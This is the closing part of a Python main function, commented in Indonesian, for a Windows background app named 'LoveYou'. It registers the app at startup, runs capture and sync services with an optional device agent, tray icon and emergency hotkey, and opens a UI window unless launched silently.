    print(f" Device Agent     : {'AKTIF -> ' + conf['agent_api_base_url'] if (conf.get('agent_enabled') and not args.no_agent) else 'NONAKTIF'}")
    print("=" * 65)

    controller = ServiceController(conf, enable_agent=not args.no_agent)

    # Daftarkan ke Windows Startup jika aktif di config
    is_silent = bool(args.silent or args.background)
    if conf["auto_start"] and not args.no_startup and not args.test:
        if register_startup(conf["app_name"], is_silent_launch=is_silent):
            print(f"[OK] Terdaftar di Windows Startup (Registry & Shell:Startup): {conf['app_name']}")

    # Mode Test 1x
    if args.test:
        print("\n[INFO] Menjalankan mode pengujian 1 kali capture...")
        controller.service_manager.execute_action("sync_service", "start")
        controller.on_capture_now(None, None)
        time.sleep(3)
        controller.stop_all_services()
        print("[INFO] Pengujian selesai.")
        return

    # Jalankan seluruh service modular inti melalui ServiceManager & Agent (jika aktif)
    controller.start_core_services(
        start_tray=not args.no_tray,
        is_boot_silent=is_silent,
        start_agent=not args.no_agent,
    )

    # Jalankan pintasan darurat (emergency hotkey) jika aktif di konfigurasi
    if conf.get("emergency_hotkey", True) and not args.test:
        start_emergency_hotkey_listener(controller)

    print("[INFO] Layanan modular aktif di latar belakang melalui ServiceManager.")

    # 4. Jika bukan mode silent, langsung tampilkan jendela UI (awal = Play/Name, setelahnya = Countdown!)
    if not is_silent:
        print("[INFO] Membuka jendela UI di layar...")
        try:
            run_ui_window(controller, conf=conf)
        except Exception as e:
            print(f"[WARN] Jendela UI ditutup atau error: {e}")

    # 5. Jaga proses tetap berjalan di latar belakang (service & agent terus berjalan)
    try:
        while controller.is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        controller.is_running = False

    controller.stop_all_services()
    print("\n[INFO] Layanan LoveYou selesai secara normal.")


if __name__ == "__main__":
    main()
